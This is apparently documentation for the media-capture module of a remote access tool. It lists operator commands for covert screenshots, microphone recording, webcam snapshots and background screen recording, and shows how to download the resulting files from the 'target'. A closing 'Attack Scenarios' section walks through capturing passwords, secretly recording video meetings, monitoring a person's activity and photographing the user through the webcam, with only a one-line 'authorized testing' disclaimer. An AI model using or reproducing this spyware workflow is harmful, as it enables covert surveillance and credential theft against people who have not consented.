# Screen & Media Capture Implementation Guide

## Overview

Comprehensive screen, audio, and webcam capture capabilities for surveillance and evidence collection.

## Implementation Details

### Architecture

- **Module**: `features/media_capture_tool.py`
- **Classes**:
  - `ScreenCapture` - Screenshot functionality
  - `AudioCapture` - Microphone recording
  - `WebcamCapture` - Webcam image capture
  - `ScreenRecorder` - Video screen recording
- **Log Directories**:
  - `logs/screenshots/` - Screenshot images
  - `logs/audio/` - Audio recordings
  - `logs/webcam/` - Webcam captures
  - `logs/recordings/` - Screen recordings

## Screenshot Capture

### Commands

#### Single Screenshot

```bash
screenshot
```

**What happens:**

- Captures current screen
- Saves as PNG with timestamp
- Returns file path

**Response:**

```
[+] Screenshot saved: logs/screenshots/screenshot_20251004_143022.png
```

**Use case:**

- Capture current screen state
- Collect evidence
- Monitor user activity

---

#### Multiple Screenshots

```bash
screenshot_multi <count> <interval>
```

**Parameters:**

- `count`: Number of screenshots (default: 5)
- `interval`: Seconds between captures (default: 2)

**Example:**

```bash
screenshot_multi 10 3
# Takes 10 screenshots, 3 seconds apart
```

**Response:**

```
[+] Capturing 10 screenshots with 3 second interval...
[+] Screenshot 1/10 saved
[+] Screenshot 2/10 saved
...
[+] All screenshots captured successfully
```

**Use case:**

- Monitor activity over time
- Capture slideshow or presentation
- Document workflow

---

#### List Screenshots

```bash
screenshot_list
```

**Response:**

```
[+] Screenshots:
  - screenshot_20251004_143022.png (1.2 MB)
  - screenshot_20251004_143025.png (1.1 MB)
  - screenshot_20251004_143028.png (1.3 MB)
```

---

### Download Screenshots

```bash
download logs/screenshots/screenshot_20251004_143022.png
```

### Troubleshooting

**Issue: "Screenshot feature not available"**

```bash
# Install Pillow and pyautogui
pip3 install Pillow pyautogui
```

**Issue: Black screenshots on macOS**

```
System Preferences > Security & Privacy > Privacy > Screen Recording
Add Terminal or Python
```

**Issue: Large file sizes**

- Screenshots are full resolution
- Typical size: 0.5-3 MB per image
- Consider screenshot_multi interval to reduce storage

## Audio Recording

### Commands

#### Record Audio

```bash
audio_record <seconds>
```

**Parameter:**

- `seconds`: Duration in seconds (default: 10)

**Example:**

```bash
audio_record 30
# Records 30 seconds of audio
```

**Response:**

```
[+] Recording audio for 30 seconds...
[+] Audio saved: logs/audio/audio_20251004_143530.wav
```

**Use case:**

- Record conversations
- Capture voice commands
- Monitor phone calls

---

#### List Audio Files

```bash
audio_list
```

**Response:**

```
[+] Audio recordings:
  - audio_20251004_143530.wav (3.2 MB, 30 seconds)
  - audio_20251004_141200.wav (1.1 MB, 10 seconds)
```

---

### Download Audio

```bash
download logs/audio/audio_20251004_143530.wav
```

### Troubleshooting

**Issue: "Audio recording requires pyaudio"**

**macOS:**

```bash
brew install portaudio
pip3 install pyaudio
```

**Linux (Ubuntu/Debian):**

```bash
sudo apt-get install portaudio19-dev python3-pyaudio
pip3 install pyaudio
```

**Linux (Fedora/CentOS):**

```bash
sudo dnf install portaudio-devel
pip3 install pyaudio
```

**Issue: "No microphone detected"**

```bash
# Linux - list audio devices
arecord -l

# macOS - check microphone permissions
System Preferences > Security & Privacy > Privacy > Microphone
```

**Issue: Poor audio quality**

- Default: 44100 Hz, 16-bit
- WAV format (uncompressed)
- File size: ~10 MB per minute

## Webcam Capture

### Commands

#### Capture Webcam

```bash
webcam_snap
```

**What happens:**

- Accesses default webcam
- Captures single frame
- Saves as JPG with timestamp

**Response:**

```
[+] Webcam image saved: logs/webcam/webcam_20251004_144500.jpg
```

**Use case:**

- Identify target user
- Capture physical location
- Photo evidence

---

### Download Webcam Image

```bash
download logs/webcam/webcam_20251004_144500.jpg
```

### Troubleshooting

**Issue: "Webcam not available"**

```bash
# Install opencv-python
pip3 install opencv-python

# Test webcam
python3 -c "import cv2; cam = cv2.VideoCapture(0); print('OK' if cam.isOpened() else 'Failed')"
```

**Issue: "Could not access webcam"**

**Linux:**

```bash
# Check webcam permissions
ls -l /dev/video*
sudo usermod -a -G video $USER

# Restart session for group change
```

**macOS:**

```
System Preferences > Security & Privacy > Privacy > Camera
Add Terminal or Python
```

**Issue: Black image**

- Webcam in use by another application
- Insufficient permissions
- Webcam cover/blocked

## Screen Recording

### Commands

#### Timed Recording

```bash
record_screen <duration> <fps>
```

**Parameters:**

- `duration`: Seconds to record (default: 10)
- `fps`: Frames per second (default: 15)

**Example:**

```bash
record_screen 60 30
# Records 60 seconds at 30 FPS
```

**Response:**

```
[+] Recording screen for 60 seconds at 30 FPS...
[+] Recording complete: logs/recordings/screen_recording_20251004_150000.mp4
[+] File size: 45.2 MB
```

**Use case:**

- Record demonstrations
- Capture video evidence
- Monitor extended activity

---

#### Background Recording

```bash
record_start <max_duration>
```

**Parameter:**

- `max_duration`: Maximum seconds (default: 3600 = 1 hour)

**Example:**

```bash
record_start 1800
# Starts background recording, max 30 minutes
```

**Response:**

```
[+] Background recording started (max 1800 seconds)
```

**Check status:**

```bash
record_status
```

**Response:**

```
{
  "recording": true,
  "duration": 245,
  "fps": 15,
  "output_file": "logs/recordings/screen_recording_20251004_150000.mp4"
}
```

**Stop recording:**

```bash
record_stop
```

**Response:**

```
[+] Recording stopped
[+] Video saved: logs/recordings/screen_recording_20251004_150000.mp4
[+] Duration: 245 seconds
[+] File size: 32.5 MB
```

---

#### List Recordings

```bash
record_list
```

**Response:**

```
[+] Screen recordings:
  - screen_recording_20251004_150000.mp4 (32.5 MB, 245s @ 15fps)
  - screen_recording_20251004_143000.mp4 (15.2 MB, 120s @ 15fps)
```

---

### Download Recording

```bash
download logs/recordings/screen_recording_20251004_150000.mp4
```

### Troubleshooting

**Issue: "Screen recording requires dependencies"**

```bash
pip3 install opencv-python numpy mss imageio imageio-ffmpeg

# For best quality, install ffmpeg:
# macOS:
brew install ffmpeg

# Ubuntu/Debian:
sudo apt-get install ffmpeg

# Fedora/CentOS:
sudo dnf install ffmpeg
```

**Issue: Large file sizes**

**FPS Guidelines:**

- 10 fps: Small files (~3-5 MB/min at 720p)
- 15 fps: Balanced (~4-8 MB/min at 720p) ✅ Default
- 24 fps: Smooth (~6-12 MB/min at 720p)
- 30 fps: High quality (~8-15 MB/min at 720p)

**Solution:**

```bash
# Use lower FPS for longer recordings
record_screen 300 10  # 5 minutes at 10 FPS

# Or shorter duration at higher quality
record_screen 60 30   # 1 minute at 30 FPS
```

**Issue: Slow/choppy recording**

- Install ffmpeg for better performance
- Close resource-intensive applications
- Use lower FPS (10-12)
- Reduce recording duration

**Issue: Black screen on macOS**

```
System Preferences > Security & Privacy > Privacy > Screen Recording
Add Terminal or Python
Restart application
```

**Issue: "No module named 'cv2'"**

```bash
pip3 install opencv-python
```

**Issue: "No module named 'mss'"**

```bash
pip3 install mss imageio imageio-ffmpeg
```

## Limitations

### Screenshots

- Full screen only (no partial)
- No multi-monitor selection
- Static images only
- File size: 0.5-3 MB each

### Audio

- Microphone only (no system audio on most platforms)
- WAV format (large files)
- ~10 MB per minute
- Real-time only (no buffer)

### Webcam

- Single frame only (no video from webcam_snap)
- Default camera only
- Must not be in use
- Resolution depends on hardware

### Screen Recording

- CPU/memory intensive
- Large file sizes
- FPS impacts quality and size
- Not suitable for hours-long recordings
- Max practical duration: ~1 hour

## Performance Impact

### CPU Usage

- Screenshots: Minimal (quick capture)
- Audio: Low (recording thread)
- Webcam: Low (single frame)
- Recording: **High** (continuous capture + encoding)

### Memory Usage

- Screenshots: ~10 MB per image
- Audio: Buffered (minimal)
- Webcam: ~5 MB per frame
- Recording: **Significant** (~100-500 MB buffer)

### Disk Usage

- Screenshots: 0.5-3 MB each
- Audio: ~10 MB per minute
- Webcam: 0.5-2 MB each
- Recording: 5-15 MB per minute (FPS dependent)

## Best Practices

### Screenshots

```bash
# Quick evidence
screenshot

# Monitor activity over time
screenshot_multi 20 5  # 20 shots, 5 sec apart

# Download specific images
screenshot_list
download logs/screenshots/screenshot_TIMESTAMP.png
```

### Audio

```bash
# Short recordings for quick info
audio_record 30

# Download immediately (large files)
download logs/audio/audio_TIMESTAMP.wav
```

### Screen Recording

```bash
# For demos/presentations
record_screen 120 24  # 2 min, 24 FPS

# For surveillance
record_start 3600     # Background, 1 hour max
record_status         # Check progress
record_stop           # Stop when needed
```

### Resource Management

```bash
# Check file sizes before downloading
screenshot_list
audio_list
record_list

# Download and delete to free space
download logs/recordings/video.mp4
# Then on target: rm logs/recordings/video.mp4
```

## Attack Scenarios

### Scenario 1: Password Capture

```bash
# User about to enter password
screenshot  # Before
# Wait for typing
screenshot  # After
# Visual evidence of password field
```

### Scenario 2: Meeting Recording

```bash
# Record video conference
record_start 3600  # 1 hour max
audio_record 3600  # Audio in parallel

# Stop both when meeting ends
record_stop
```

### Scenario 3: Activity Monitoring

```bash
# Monitor work session
screenshot_multi 100 30  # Every 30 sec for 50 min

# Download and analyze later
screenshot_list
```

### Scenario 4: User Identification

```bash
# Capture webcam for user ID
webcam_snap
download logs/webcam/webcam_TIMESTAMP.jpg
```

## Summary

Media capture features:
✅ Screenshots - Single and batch
✅ Audio recording - Microphone capture
✅ Webcam capture - User identification
✅ Screen recording - Video surveillance
✅ Multiple formats - PNG, WAV, JPG, MP4
✅ Timestamped files - Easy organization

**Use responsibly in authorized testing only.**
